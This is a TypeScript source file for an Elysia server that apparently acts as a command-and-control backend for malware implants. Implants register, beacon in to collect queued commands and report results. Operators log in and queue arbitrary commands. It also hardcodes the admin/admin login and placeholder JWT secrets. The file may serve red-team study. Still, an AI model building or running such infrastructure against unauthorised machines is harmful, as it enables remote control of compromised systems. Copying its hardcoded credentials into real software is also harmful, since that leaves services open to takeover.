import { Elysia, t } from 'elysia';
import { jwt } from '@elysiajs/jwt';
import { swagger } from '@elysiajs/swagger';

enum CommandStatus {
  Queued = 'Queued',
  Executing = 'Executing',
  Completed = 'Completed',
  Failed = 'Failed',
}

interface Command {
  id: string;
  implantId: string;
  type: string;
  payload: any;
  status: CommandStatus;
  response?: any;
}

interface Implant {
  id: string;
  lastSeenAt: Date;
}

const app = new Elysia()
  .use(swagger())
  .use(
    jwt({
      name: 'implantJWT',
      secret: 'implent JWT secret',
      schema: t.Object({ id: t.String() }),
    }),
  )
  .use(
    jwt({
      name: 'clientJWT',
      secret: 'client JWT secret',
    }),
  )
  .state({
    implants: {} as Record<string, Implant>,
    commands: {} as Record<string, Command>,
  })
  .macro(({ onBeforeHandle }) => ({
    isSignIn(enabled: boolean) {
      if (!enabled) return;

      onBeforeHandle(
        async ({ headers: { authorization }, error, clientJWT }) => {
          if (!authorization) {
            return error(401, { success: false, message: 'Unauthorized' });
          }

          const payload = await clientJWT.verify(authorization);
          if (payload == false) {
            return error(401, { success: false, message: 'Unauthorized' });
          }
        },
      );
    },
  }))
  .post(
    '/auth/signin',
    async ({ body: { username, password }, error, clientJWT }) => {
      if (username !== 'admin' || password !== 'admin') {
        return error(401, { success: false, message: 'Invalid credentials' });
      }

      const token = await clientJWT.sign({});

      return {
        success: true,
        message: 'Signin successful',
        token,
      };
    },
    {
      body: t.Object({
        username: t.String(),
        password: t.String(),
      }),
    },
  )
  .get('/implants', ({ store: { implants } }) => Object.values(implants), {
    isSignIn: true,
  })
  .get(
    '/implants/:id',
    ({ store: { implants }, error, params: { id } }) => {
      const implant = implants[id];
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }
      return {
        success: true,
        message: 'Implant found',
        implant,
      };
    },
    { params: t.Object({ id: t.String() }), isSignIn: true },
  )
  .post('/implants', async ({ store: { implants }, implantJWT }) => {
    const id = crypto.randomUUID();
    implants[id] = { id, lastSeenAt: new Date() };

    const token = await implantJWT.sign({ id });

    return {
      sucess: true,
      message: 'Implant created',
      token,
      implant: implants[id],
    };
  })
  .post(
    '/implants/beacon',
    async ({
      store: { implants, commands },
      implantJWT,
      headers: { authorization },
      error,
    }) => {
      const jwtPayload = await implantJWT.verify(authorization);

      if (jwtPayload == false) {
        return error(401, { success: false, message: 'Unauthorized' });
      }

      const id = jwtPayload.id;

      const implant = implants[id];
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      implant.lastSeenAt = new Date();

      const commandsToSend = Object.values(commands).filter(
        (command) =>
          command.implantId == id && command.status == CommandStatus.Queued,
      );

      return {
        success: true,
        message: 'Implant updated',
        implant,
        commands: commandsToSend,
      };
    },
    {
      headers: t.Object({ authorization: t.String() }),
    },
  )
  .get('/commands', ({ store: { commands } }) => Object.values(commands), {
    isSignIn: true,
  })
  .get(
    '/commands/:id',
    ({ store: { commands }, params: { id }, error }) => {
      const command = commands[id];
      if (!command) {
        return error(404, { success: false, message: 'Implant not found' });
      }
      return {
        success: true,
        message: 'Command found',
        command,
      };
    },
    {
      params: t.Object({
        id: t.String(),
      }),
      isSignIn: true,
    },
  )
  .post(
    '/commands',
    ({
      store: { implants, commands },
      error,
      body: { implantId, type, payload },
    }) => {
      const implant = implants[implantId];
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      const command: Command = {
        id: crypto.randomUUID(),
        implantId,
        type: type,
        status: CommandStatus.Queued,
        payload,
      };

      commands[command.id] = command;

      return {
        success: true,
        message: 'Command created',
        command,
      };
    },
    {
      body: t.Object({
        implantId: t.String(),
        type: t.String(),
        payload: t.Any(),
      }),
      isSignIn: true,
    },
  )
  .post(
    '/commands/:id/status',
    async ({
      params: { id: commandId },
      headers: { authorization },
      body: { status, response },
      store: { implants, commands },
      implantJWT,
      error,
    }) => {
      const jwtPayload = await implantJWT.verify(authorization);

      if (jwtPayload == false) {
        return error(401, { success: false, message: 'Unauthorized' });
      }

      const implantId = jwtPayload.id;
      const implant = implants[implantId];
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      const command = commands[commandId];
      if (!command || command.implantId != implantId) {
        return error(404, { success: false, message: 'Command not found' });
      }

      command.status = status;
      command.response = response;

      return {
        success: true,
        message: 'Command updated',
        command,
      };
    },
    {
      params: t.Object({ id: t.String() }),
      headers: t.Object({ authorization: t.String() }),
      body: t.Object({
        status: t.Enum(CommandStatus),
        response: t.Optional(t.Any()),
      }),
    },
  )
  .listen(3000);

console.log(
  `🦊 Elysia is running at ${app.server?.hostname}:${app.server?.port}`,
);
